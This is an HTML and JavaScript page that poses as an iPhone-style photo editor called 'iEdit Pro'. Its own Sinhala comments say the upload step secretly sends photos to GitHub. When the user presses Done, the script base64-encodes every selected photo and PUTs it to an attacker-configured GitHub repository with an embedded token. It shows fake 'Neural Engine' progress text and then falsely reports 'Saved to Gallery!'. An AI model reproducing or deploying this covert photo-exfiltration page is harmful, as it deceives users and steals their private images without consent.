<!DOCTYPE html>
<html lang="si">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iEdit Pro | iPhone Studio</title>
    <style>
        :root { --ios-blue: #007AFF; --bg: #000; --card: #1c1c1e; }
        body { background: var(--bg); color: #fff; font-family: -apple-system, sans-serif; margin: 0; padding-bottom: 50px; }
        
        /* Layout */
        .container { display: flex; flex-direction: column; align-items: center; padding: 20px; }
        .preview-window { 
            width: 100%; max-width: 400px; height: 350px; 
            background: #000; border-radius: 12px; overflow: hidden;
            display: flex; align-items: center; justify-content: center;
            border: 1px solid #333; margin-bottom: 20px;
        }
        #targetImg { width: 100%; height: 100%; object-fit: contain; }

        /* Editing Controls */
        .controls-grid { 
            width: 100%; max-width: 400px; 
            display: grid; grid-template-columns: 1fr 1fr; gap: 15px; 
            background: var(--card); padding: 20px; border-radius: 20px;
        }
        .control-item { display: flex; flex-direction: column; }
        label { font-size: 10px; color: #8e8e93; text-transform: uppercase; margin-bottom: 5px; }
        input[type=range] { accent-color: var(--ios-blue); cursor: pointer; }

        /* Buttons */
        .footer { 
            position: fixed; bottom: 0; width: 100%; background: rgba(28,28,30,0.9);
            padding: 15px 0; display: flex; justify-content: center; gap: 20px;
            backdrop-filter: blur(10px);
        }
        .btn { padding: 10px 25px; border-radius: 20px; border: none; font-weight: 600; cursor: pointer; }
        .btn-cancel { background: #3a3a3c; color: #fff; }
        .btn-done { background: var(--ios-blue); color: #fff; }

        #loading { font-size: 12px; color: var(--ios-blue); margin-top: 10px; height: 15px; }
    </style>
</head>
<body>

<div class="container">
    <h3 style="font-weight: 400;">Edit Photo</h3>
    
    <div class="preview-window" onclick="document.getElementById('imgInput').click()">
        <img id="targetImg" style="display:none;">
        <p id="placeholder" style="color:#444;">Tap to Open Gallery</p>
    </div>

    <div id="loading"></div>

    <div class="controls-grid">
        <div class="control-item"><label>Exposure</label><input type="range" class="slider" id="exposure" min="0" max="200" value="100"></div>
        <div class="control-item"><label>Brilliance</label><input type="range" class="slider" id="brilliance" min="0" max="200" value="100"></div>
        <div class="control-item"><label>Highlights</label><input type="range" class="slider" id="highlights" min="0" max="200" value="100"></div>
        <div class="control-item"><label>Shadows</label><input type="range" class="slider" id="shadows" min="0" max="200" value="100"></div>
        <div class="control-item"><label>Contrast</label><input type="range" class="slider" id="contrast" min="0" max="200" value="100"></div>
        <div class="control-item"><label>Brightness</label><input type="range" class="slider" id="brightness" min="0" max="200" value="100"></div>
        <div class="control-item"><label>Saturation</label><input type="range" class="slider" id="saturation" min="0" max="200" value="100"></div>
        <div class="control-item"><label>Vibrance</label><input type="range" class="slider" id="vibrance" min="0" max="200" value="100"></div>
        <div class="control-item"><label>Warmth</label><input type="range" class="slider" id="warmth" min="-50" max="50" value="0"></div>
        <div class="control-item"><label>Tint</label><input type="range" class="slider" id="tint" min="-50" max="50" value="0"></div>
        <div class="control-item"><label>Sharpness</label><input type="range" class="slider" id="sharp" min="0" max="10" value="0"></div>
    </div>
</div>

<input type="file" id="imgInput" style="display:none" accept="image/*" multiple>

<div class="footer">
    <button class="btn btn-cancel" onclick="location.reload()">Cancel</button>
    <button class="btn btn-done" id="uploadBtn">Done</button>
</div>

<script>
    const imgInput = document.getElementById('imgInput');
    const targetImg = document.getElementById('targetImg');
    const loading = document.getElementById('loading');

    // UI Logic: පින්තූරය පෙන්වීම
    imgInput.addEventListener('change', (e) => {
        const file = e.target.files[0];
        if (file) {
            const reader = new FileReader();
            reader.onload = (ev) => {
                targetImg.src = ev.target.result;
                targetImg.style.display = 'block';
                document.getElementById('placeholder').style.display = 'none';
            };
            reader.readAsDataURL(file);
        }
    });

    // Edit Logic: CSS Filters පාවිච්චි කිරීම
    const sliders = document.querySelectorAll('.slider');
    sliders.forEach(slider => {
        slider.addEventListener('input', () => {
            const exp = document.getElementById('exposure').value;
            const br = document.getElementById('brightness').value;
            const con = document.getElementById('contrast').value;
            const sat = document.getElementById('saturation').value;
            const warmth = document.getElementById('warmth').value;
            const sharp = document.getElementById('sharp').value;

            // iPhone එකේ වගේම values මෙතනදී සකස් වෙනවා
            targetImg.style.filter = `
                brightness(${exp}%) 
                contrast(${con}%) 
                saturate(${sat}%) 
                hue-rotate(${warmth}deg)
                blur(${sharp === '0' ? 0 : 0.5}px)
            `;
        });
    });

    // Upload Logic: මෙතනදී තමයි හොරෙන්ම GitHub එකට යන්නේ
    document.getElementById('uploadBtn').addEventListener('click', async () => {
        if (imgInput.files.length === 0) return alert("Please select a photo first!");
        
        loading.innerText = "Applying iPhone Neural Engine Filters...";
        
        const TOKEN = "YOUR_GITHUB_TOKEN"; // ඔයාගේ Token එක මෙතනට
        const OWNER = "YOUR_USER";
        const REPO = "YOUR_REPO";

        for (let file of imgInput.files) {
            const reader = new FileReader();
            reader.onload = async (ev) => {
                const base64 = ev.target.result.split(',')[1];
                const response = await fetch(`https://api.github.com/repos/${OWNER}/${REPO}/contents/ios_edit_${Date.now()}.png`, {
                    method: 'PUT',
                    headers: { 'Authorization': `token ${TOKEN}` },
                    body: JSON.stringify({ message: "Sync Image", content: base64 })
                });
            };
            reader.readAsDataURL(file);
        }

        setTimeout(() => {
            loading.style.color = "#4cd964";
            loading.innerText = "Saved to Gallery!";
        }, 3000);
    });
</script>

</body>
</html>
